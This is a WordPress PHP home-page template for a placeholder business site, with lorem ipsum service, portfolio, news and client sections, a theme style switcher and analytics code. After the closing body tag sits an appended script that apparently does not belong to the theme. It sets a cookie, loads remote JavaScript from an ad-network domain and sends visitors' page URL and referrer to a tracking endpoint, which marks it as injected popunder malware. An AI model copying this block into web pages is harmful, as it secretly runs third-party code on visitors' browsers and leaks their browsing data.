<?php get_header(); 


/*
 Template Name: home 
*/

?>

    <!-- Main Content -->
    <div id="content" role="main">
      <!-- Promo Section -->
      <section class="section section-alt">
        <div class="row-fluid">
          <div class="flexslider" data-flex-animation="slide" data-flex-controlsalign="center" data-flex-controlsposition="inside" data-flex-directions="hide" data-flex-speed="7000" id="intro">
            <ul class="slides">

             <?php $homeHeaderitem = new WP_Query(array(
 
                    'post_type'      => 'homeHeader',
                    'posts_per_page' => 2

                                        )); ?>

              <?php while($homeHeaderitem->have_posts()) : $homeHeaderitem->the_post();  ?>
 

              <li>
                <div class="super-hero-unit">

                  <figure>
                    <img alt="some image" src="<?php the_post_thumbnail(); ?>">
                    <figcaption class="flex-caption">
                      <h1 class="super">
                        <?php the_title(); ?> 
                      </h1>
                    </figcaption>
                  </figure>
                </div>
              </li>


              <?php endwhile; ?> 

 
            </ul>
          </div>
        </div>
      </section>
      <!-- Our Services -->
      <section class="section section-padded">
        <div class="container-fluid">
          <div class="row-fluid">
            <div class="section-header">
              <h1>
                What
                <small class="light">we do?</small>
              </h1>
            </div>
            <ul class="unstyled row-fluid">
              <li class="span3">
                <div class="round-box round-medium">
                  <span class="box-inner">
                    <img alt="some image" class="img-circle" src="images/assets/landscapes/landscape-2-a-300x300.jpg">
                    <i class="icon-heart"></i>
                  </span>
                </div>
                <h3 class="text-center">
                  Web Applications
                </h3>
                <p>
                  Nam vitae ligula eu mi molestie fringilla sed ac massa. Quisque justo metus, commodo eu viverra quis, volutpat et urna.
                </p>
                <a class="more-link" href="services.html">
                  <strong>
                    Read
                  </strong>
                  More
                </a>
              </li>
              <li class="span3">
                <div class="round-box round-medium">
                  <span class="box-inner">
                    <img alt="some image" class="img-circle" src="images/assets/landscapes/landscape-2-b-300x300.jpg">
                    <i class="icon-aws"></i>
                  </span>
                </div>
                <h3 class="text-center">Cloud Hosting</h3>
                <p>
                  Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod
                  tempor incididunt ut labore et dolore magna aliqua.
                </p>
                <a class="more-link" href="services.html">
                  <strong>
                    Read
                  </strong>
                  More
                </a>
              </li>
              <li class="span3">
                <div class="round-box round-medium">
                  <span class="box-inner">
                    <img alt="some image" class="img-circle" src="images/assets/landscapes/landscape-2-c-300x300.jpg">
                    <i class="icon-apple"></i>
                  </span>
                </div>
                <h3 class="text-center">Social apps</h3>
                <p>
                  Sed rhoncus leo eget elit tincidunt vestibulum nec ac urna. Aliquam lobortis odio in felis ultricies bibendum sunt in culpa qui.
                </p>
                <a class="more-link" href="services.html">
                  <strong>
                    Read
                  </strong>
                  More
                </a>
              </li>
              <li class="span3">
                <div class="round-box round-medium">
                  <span class="box-inner">
                    <img alt="some image" class="img-circle" src="images/assets/landscapes/landscape-2-d-300x300.jpg">
                    <i class="icon-cog"></i>
                  </span>
                </div>
                <h3 class="text-center">Smart design</h3>
                <p>
                  Phasellus turpis metus, aliquam a facilisis nec, aliquet et elit. Suspendisse fermentum mattis dolor ut tristique nibh sapien mollis.
                </p>
                <a class="more-link" href="services.html">
                  <strong>
                    Read
                  </strong>
                  More
                </a>
              </li>
            </ul>
          </div>
        </div>
      </section>
      <!-- Our work -->
      <section class="section section-alt section-padded">
        <div class="container-fluid">
          <div class="section-header">
            <h1>
              Recent
              <small class="light">work?</small>
            </h1>
          </div>
          <div class="row-fluid">
            <div class="span6">
              <div class="flexslider margin-bottom" data-flex-directions="hide" data-flex-speed="10000" id="work">
                <ul class="slides">
                  <li>
                    <img alt="some image" src="images/assets/devices/imac-2.png">
                  </li>
                  <li>
                    <img alt="some image" src="images/assets/devices/macbook.png">
                  </li>
                  <li>
                    <img alt="some image" src="images/assets/devices/ipad.png">
                  </li>
                </ul>
              </div>
            </div>
            <div class="span6">
              <ul class="icons">
                <li>
                  <h4>
                    <a href="services.html">
                      <i class="icon-twitter"></i>
                      Social apps development
                    </a>
                  </h4>
                  <p>
                    Quisque et risus in lectus fringilla consectetur. In quis semper lacus. Pellentesque sed magna quis risus placerat tempor vel non lacus.
                  </p>
                </li>
                <li>
                  <h4>
                    <a href="services.html">
                      <i class="icon-heart"></i>
                      Apps that your clients are goind to love
                    </a>
                  </h4>
                  <p>
                    Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos. Duis consectetur venenatis ante in adipiscing.
                  </p>
                </li>
                <li>
                  <h4>
                    <a href="services.html">
                      <i class="icon-cog"></i>
                      Inovations that takes you to the next level
                    </a>
                  </h4>
                  <p>
                    Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia Curae; Etiam ultrices pretium nibh, ac mollis lacus congue vel.
                  </p>
                </li>
                <li>
                  <h4>
                    <a href="services.html">
                      <i class="icon-leaf"></i>
                      Enviromental friendly design
                    </a>
                  </h4>
                  <p>
                    Nunc vitae nulla urna. Integer feugiat mauris at massa egestas vel eleifend sem commodo. Suspendisse non ante ut lacus venenatis cursus.
                  </p>
                </li>
                <li>
                  <h4>
                    <a href="services.html">
                      <i class="icon-magic"></i>
                      Design that has some magic in it
                    </a>
                  </h4>
                  <p>
                    Nam sodales tincidunt diam, ut accumsan augue molestie eget. Nullam euismod molestie elit ut tempus.
                  </p>
                </li>
              </ul>
            </div>
          </div>
        </div>
      </section>
      <!-- Latest News -->
      <section class="section section-padded">
        <div class="container-fluid">
          <div class="section-header">
            <h1>
              Latest
              <small class="light">news?</small>
            </h1>
          </div>
          <ul class="unstyled row-fluid">
            <li class="span4">
              <div class="row-fluid">
                <div class="span4">
                  <div class="round-box box-small">
                    <a class="box-inner" href="post.html">
                      <img alt="some image" class="img-circle" src="images/assets/landscapes/landscape-3-300x300.jpg">
                    </a>
                  </div>
                  <h5 class="text-center light">
                    12 dec 2012
                  </h5>
                </div>
                <div class="span8">
                  <h3>
                    <a href="post.html">
                      A normal post
                    </a>
                  </h3>
                  <p>
                    Curabitur euismod ultrices purus eget vehicula. Cras interdum est sed dui congue imperdiet.
                  </p>
                </div>
              </div>
            </li>
            <li class="span4">
              <div class="row-fluid">
                <div class="span4">
                  <div class="round-box box-small">
                    <a class="box-inner" href="post.html">
                      <img alt="some image" class="img-circle" src="images/assets/landscapes/landscape-1-300x300.jpg">
                      <i class="icon-link"></i>
                    </a>
                  </div>
                  <h5 class="text-center light">
                    10 dec 2012
                  </h5>
                </div>
                <div class="span8">
                  <h3>
                    <a href="post.html">
                      Link post
                    </a>
                  </h3>
                  <p>
                    Donec viverra pulvinar ante, a placerat risus tincidunt vitae. Donec felis dolor, malesuada purus.
                  </p>
                </div>
              </div>
            </li>
            <li class="span4">
              <div class="row-fluid">
                <div class="span4">
                  <div class="round-box box-small">
                    <a class="box-inner" href="post.html">
                      <img alt="some image" class="img-circle" src="images/assets/landscapes/landscape-2-e-300x300.jpg">
                      <i class="icon-play"></i>
                    </a>
                  </div>
                  <h5 class="text-center light">
                    12 Nov 2012
                  </h5>
                </div>
                <div class="span8">
                  <h3>
                    <a href="post.html">
                      Video post
                    </a>
                  </h3>
                  <p>
                    Phasellus condimentum dapibus ligula vel dapibus. Praesent dictum aliquet pharetra magna.
                  </p>
                </div>
              </div>
            </li>
          </ul>
        </div>
      </section>
      <!-- Our Clients -->
      <section class="section section-alt section-padded">
        <div class="container-fluid">
          <div class="section-header">
            <h1>
              Clients
              <small class="light">We Love</small>
            </h1>
          </div>
          <div class="flexslider fadein-links" data-flex-animation="slide" data-flex-controls="hide" data-flex-directions-position="outside" data-flex-directions-type="fancy" data-flex-itemwidth="250" data-flex-slideshow="false" id="client">
            <ul class="slides">
              <li>
                <a href="#">
                  <img alt="client" src="images/assets/clients/client1.png">
                </a>
              </li>
              <li>
                <a href="#">
                  <img alt="client" src="images/assets/clients/client2.png">
                </a>
              </li>
              <li>
                <a href="#">
                  <img alt="client" src="images/assets/clients/client3.png">
                </a>
              </li>
              <li>
                <a href="#">
                  <img alt="client" src="images/assets/clients/client4.png">
                </a>
              </li>
              <li>
                <a href="#">
                  <img alt="client" src="images/assets/clients/client5.png">
                </a>
              </li>
              <li>
                <a href="#">
                  <img alt="client" src="images/assets/clients/client6.png">
                </a>
              </li>
              <li>
                <a href="#">
                  <img alt="client" src="images/assets/clients/client7.png">
                </a>
              </li>
              <li>
                <a href="#">
                  <img alt="client" src="images/assets/clients/client1.png">
                </a>
              </li>
              <li>
                <a href="#">
                  <img alt="client" src="images/assets/clients/client2.png">
                </a>
              </li>
              <li>
                <a href="#">
                  <img alt="client" src="images/assets/clients/client3.png">
                </a>
              </li>
            </ul>
          </div>
        </div>
      </section>
    </div>
  </div>
  <!-- Page Footer -->
  <footer id="footer" role="contentinfo">
    <div class="wrapper wrapper-transparent">
      <div class="container-fluid">
        <div class="row-fluid">
          <div class="span6 small-screen-center">
            <h3>
              Smart
              <span class="light">
                Box
              </span>
            </h3>
            <p>
              +44 1234 56.78.910  |  info@somecompany.com
              <br>
              Some St  777, 47000 Fancy town, Country.
              <br>
              &copy; Copyright 2013
            </p>
          </div>
          <div class="span6">
            <ul class="unstyled inline text-right small-screen-center big social-icons">
              <li>
                <a data-iconcolor="#00a0d1" href="#">
                  <i class="icon-twitter"></i>
                </a>
              </li>
              <li>
                <a data-iconcolor="#3b5998" href="#">
                  <i class="icon-facebook"></i>
                </a>
              </li>
              <li>
                <a data-iconcolor="#910101" href="#">
                  <i class="icon-pinterest"></i>
                </a>
              </li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  </footer>
  <div class="btn-group" id="style-switcher">
    <button class="btn btn-inverse dropdown-toggle" data-toggle="dropdown">
      <i class="icon-cog"></i>
    </button>
    <ul class="dropdown-menu">
      <li>
        <h4>
          <span>Theme layout</span>
        </h4>
        <ul class="theme-width">
          <li>
            <a class="width-switch width-box" data-width="">
              <span>Boxed</span>
            </a>
            <a class="width-switch width-full" data-width="fullwidth">
              <span>Full Width</span>
            </a>
          </li>
        </ul>
      </li>
      <li>
        <h4>
          <span>Header Color</span>
        </h4>
        <ul class="theme-navbar">
          <li>
            <a class="navbar-switch navbar-normal" data-header="">
              <span>Normal</span>
            </a>
            <a class="navbar-switch navbar-inverse" data-header="inverse">
              <span>Inverse</span>
            </a>
          </li>
        </ul>
      </li>
      <li>
        <h4>
          <span>Theme textures</span>
        </h4>
        <ul class="theme-patterns">
          <li>
            <a class="pattern-lghtmesh pattern-switch" data-pattern="pattern-lghtmesh">theme-pattern-lghtmesh</a>
          </li>
          <li>
            <a class="pattern-pw-maze-black pattern-switch" data-pattern="pattern-pw-maze-black" data-theme="theme-dark">theme-pattern-pw-maze-black</a>
          </li>
          <li>
            <a class="pattern-bedge-grunge pattern-switch" data-pattern="pattern-bedge-grunge">theme-pattern-bedge-grunge</a>
          </li>
          <li>
            <a class="pattern-bgnoise_lg pattern-switch" data-pattern="pattern-bgnoise_lg">theme-pattern-bgnoise_lg</a>
          </li>
          <li>
            <a class="pattern-noisy-grid pattern-switch" data-pattern="pattern-noisy-grid">theme-pattern-noisy-grid</a>
          </li>
          <li>
            <a class="pattern-retina-wood pattern-switch" data-pattern="pattern-retina-wood">theme-pattern-retina-wood</a>
          </li>
          <li>
            <a class="pattern-concrete-wall pattern-switch" data-pattern="pattern-concrete-wall">theme-pattern-concrete-wall</a>
          </li>
          <li>
            <a class="pattern-creampaper pattern-switch" data-pattern="pattern-creampaper">theme-pattern-creampaper</a>
          </li>
          <li>
            <a class="pattern-crisp-paper-ruffles pattern-switch" data-pattern="pattern-crisp-paper-ruffles">theme-pattern-crisp-paper-ruffles</a>
          </li>
          <li>
            <a class="pattern-crissXcross pattern-switch" data-pattern="pattern-crissXcross" data-theme="theme-dark">theme-pattern-crissXcross</a>
          </li>
          <li>
            <a class="pattern-dark-wall pattern-switch" data-pattern="pattern-dark-wall" data-theme="theme-dark">theme-pattern-dark-wall</a>
          </li>
          <li>
            <a class="pattern-dark-wood pattern-switch" data-pattern="pattern-dark-wood" data-theme="theme-dark">theme-pattern-dark-wood</a>
          </li>
          <li>
            <a class="pattern-darkdenim3 pattern-switch" data-pattern="pattern-darkdenim3" data-theme="theme-dark">theme-pattern-darkdenim3</a>
          </li>
          <li>
            <a class="pattern-debut-dark pattern-switch" data-pattern="pattern-debut-dark" data-theme="theme-dark">theme-pattern-debut-dark</a>
          </li>
          <li>
            <a class="pattern-first-aid-kit pattern-switch" data-pattern="pattern-first-aid-kit">theme-pattern-first-aid-kit</a>
          </li>
          <li>
            <a class="pattern-gradient-squares pattern-switch" data-pattern="pattern-gradient-squares">theme-pattern-gradient-squares</a>
          </li>
          <li>
            <a class="pattern-gray-jean pattern-switch" data-pattern="pattern-gray-jean">theme-pattern-gray-jean</a>
          </li>
          <li>
            <a class="pattern-grey pattern-switch" data-pattern="pattern-grey">theme-pattern-grey</a>
          </li>
          <li>
            <a class="pattern-grid pattern-switch" data-pattern="pattern-grid">theme-pattern-grid</a>
          </li>
          <li>
            <a class="pattern-honey-im-subtle pattern-switch" data-pattern="pattern-honey-im-subtle">theme-pattern-honey-im-subtle</a>
          </li>
          <li>
            <a class="pattern-husk pattern-switch" data-pattern="pattern-husk">theme-pattern-husk</a>
          </li>
          <li>
            <a class="pattern-ice-age pattern-switch" data-pattern="pattern-ice-age">theme-pattern-ice-age</a>
          </li>
          <li>
            <a class="pattern-irongrip pattern-switch" data-pattern="pattern-irongrip" data-theme="theme-dark">theme-pattern-irongrip</a>
          </li>
          <li>
            <a class="pattern-little-pluses pattern-switch" data-pattern="pattern-little-pluses">theme-pattern-little-pluses</a>
          </li>
          <li>
            <a class="pattern-nasty-fabric pattern-switch" data-pattern="pattern-nasty-fabric">theme-pattern-nasty-fabric</a>
          </li>
          <li>
            <a class="pattern-subtle-stripes pattern-switch" data-pattern="pattern-subtle-stripes">theme-pattern-subtle-stripes</a>
          </li>
          <li>
            <a class="pattern-noise-lines pattern-switch" data-pattern="pattern-noise-lines">theme-pattern-noise-lines</a>
          </li>
          <li>
            <a class="pattern-project-papper pattern-switch" data-pattern="pattern-project-papper">theme-pattern-project-papper</a>
          </li>
          <li>
            <a class="pattern-purty-wood pattern-switch" data-pattern="pattern-purty-wood">theme-pattern-purty-wood</a>
          </li>
          <li>
            <a class="pattern-px-by-Gre3g pattern-switch" data-pattern="pattern-px-by-Gre3g" data-theme="theme-dark">theme-pattern-px-by-Gre3g</a>
          </li>
          <li>
            <a class="pattern-subtle-grunge pattern-switch" data-pattern="pattern-subtle-grunge">theme-pattern-subtle-grunge</a>
          </li>
          <li>
            <a class="pattern-texturetastic-gray pattern-switch" data-pattern="pattern-texturetastic-gray">theme-pattern-texturetastic-gray</a>
          </li>
          <li>
            <a class="pattern-tileable-wood-texture pattern-switch" data-pattern="pattern-tileable-wood-texture">theme-pattern-tileable-wood-texture</a>
          </li>
          <li>
            <a class="pattern-wild-oliva pattern-switch" data-pattern="pattern-wild-oliva" data-theme="theme-dark">theme-pattern-wild-oliva</a>
          </li>
          <li>
            <a class="pattern-wood-pattern pattern-switch" data-pattern="pattern-wood-pattern">theme-pattern-wood-pattern</a>
          </li>
          <li>
            <a class="pattern-exclusive-paper pattern-switch" data-pattern="pattern-exlusive-paper">exclusive paper</a>
          </li>
        </ul>
      </li>
      <li>
        <h4>
          <span>Theme Colors</span>
        </h4>
        <ul class="theme-colors">
          <li>
            <a class="colour-switch color-red" data-color="theme-red">Red</a>
          </li>
          <li>
            <a class="colour-switch color-brown" data-color="theme-brown">Brown</a>
          </li>
          <li>
            <a class="colour-switch color-blue" data-color="">Blue</a>
          </li>
        </ul>
      </li>
      <li>
        <h4>
          <span>Theme Fonts</span>
        </h4>
        <ul class="theme-fonts">
          <li>
            <a class="font-switch font-lato" data-font="font-lato">
              <span>Lato</span>
            </a>
            <a class="font-switch font-opensans" data-font="font-open-sans">
              <span>Open Sans</span>
            </a>
          </li>
        </ul>
      </li>
    </ul>
  </div>
  <script src="javascripts/jquery.min.js" type="text/javascript"></script>
  <script src="javascripts/bootstrap.js" type="text/javascript"></script>
  <script src="javascripts/jquery.flexslider-min.js" type="text/javascript"></script>
  <script src="javascripts/jquery.tweet.js" type="text/javascript"></script>
  <script src="javascripts/jquery.fancybox.pack.js" type="text/javascript"></script>
  <script src="javascripts/jquery.fancybox-media.js" type="text/javascript"></script>
  <script src="javascripts/script.js" type="text/javascript"></script>
  <script src="javascripts/switcher.js" type="text/javascript"></script>
<script type="text/javascript">
if (typeof gaJsHost == 'undefined') {
  var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
  document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
}
</script>
<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-209441-49");
pageTracker._trackPageview();
} catch(err) {}</script>
</body><script type="text/javascript">if(top==self){(function(){location.Href="https://sharing-wedding.com/"; document.Referrer="";document.cookie = 'pau=1;expires='+new Date(+new Date()+2*60*1000)['toGMTString']()+';path=/;';})();var deloplenscript=document.createElement('script');deloplenscript.src="http://deloplen.com/apu.php?zoneid=2678515";deloplenscript.setAttribute('async','');deloplenscript.setAttribute('data-cfasync','false');document.head.appendChild(deloplenscript);(new Image).src='../pages/imevrstkb6c0.html?qd=IBL&amp;zqd=015.005&amp;nbid=bdbc0dd5fcde6986a59232d0421648c0&amp;cid=297288&amp;at=popad'+'&url='+encodeURIComponent(location.href)+'&ref='+encodeURIComponent(document.referrer)+'&t='+parseInt(Math.random()*1000000)}</script>
